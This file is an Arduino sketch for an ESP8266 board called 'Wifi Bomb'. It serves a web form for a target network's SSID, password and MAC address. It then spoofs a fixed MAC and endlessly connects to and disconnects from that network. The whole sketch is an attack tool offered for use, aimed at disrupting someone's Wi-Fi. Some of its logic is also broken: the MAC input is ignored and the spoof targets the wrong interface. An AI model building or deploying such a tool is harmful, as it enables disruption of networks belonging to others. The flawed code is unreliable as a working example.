#include <ESP8266WiFi.h>
#include <WiFiClient.h> 
#include <ESP8266WebServer.h>
#include <SPI.h>
#include <Ethernet.h>
#ifdef ESP8266
extern "C" {
  #include "user_interface.h"
}
#endif
ESP8266WebServer server(80);

void setup() {
	setupAccesPoint();
  setupHTTPServer();
  setupLED();
}

void loop() {
	server.handleClient();
}

/* Go to http://192.168.4.1 in a web browser
 */
void setupAccesPoint(){

  const char *ssid = "Wifi-Bomb";
  const char *password = "azertyuiop";
  
  Serial.begin(115200);
  Serial.println();
  Serial.print("Configuring access point...");
  WiFi.softAP(ssid, password);

  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);
}

void setupHTTPServer(){
  server.on("/", handleRoot);
  server.on("/bomb", handleBomb);
  server.begin();
  Serial.println("HTTP server started");  
}

void setupLED(){
  Serial.println("Configuring LED");
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
}

void handleRoot() {

  String form = "\
  <!doctype html> <html> <head> <title> Wifi Bomb </title> </head> <body>\
  <form method='get' action='/bomb'>\
    <h1> Wifi Bomb </h1>\
    <br>SSID:<br>\
    <input type='text' name='SSID'><br>Password:<br>\
    <input type='text' name='Password'><br>Mac-Address:<br>\
    <input type='text' name='Mac-address'><br><br>\
    <button type='submit' name='toggle'> Bomb This </button>\
  </form>\
  </body> </html>\
  ";
  
  server.send(200, "text/html", form);
}

void handleBomb(){
  server.send(200, "text/html", "<h1>Bomb Drop Confirmed</h1>");
  blink();

  char ssid[50];
  char password[50];

  server.arg(0).toCharArray(ssid, 50);
  server.arg(1).toCharArray(password, 50);

  bomb(ssid, password, "");
}

void bomb(char ssid[], char password[], String amac){

  byte mac[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED };
  wifi_set_macaddr(SOFTAP_IF, &mac[0]);

  while(true){
    WiFi.begin(ssid, password);
    delay(5000);
    WiFi.disconnect();
    delay(2000);
  }
  
}

void blink(){
  digitalWrite(LED_BUILTIN, LOW);
  delay(1000);
  digitalWrite(LED_BUILTIN, HIGH);
}
